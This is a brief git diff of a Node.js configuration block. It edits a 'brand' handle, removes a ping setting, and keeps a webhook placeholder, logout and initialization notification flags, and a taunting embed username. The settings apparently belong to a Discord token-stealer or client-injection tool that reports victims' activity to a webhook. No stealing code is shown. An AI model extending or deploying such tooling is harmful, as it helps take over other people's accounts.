@@ -11,7 +11,7 @@ const fs = require("fs");
 // Initialization
 
 var config = {
-    brand: "imxd#7666",
+    brand: "imxd",
 
     webhook: "%WEBHOOK_LINK%",
 
@@ -20,8 +20,6 @@ var config = {
 
     notify_on_logout: true,
     notify_on_initialization: true,
-    ping: [true, "@doener"],
-
     embed: {
         username: "Don't play with me",
         footer: {
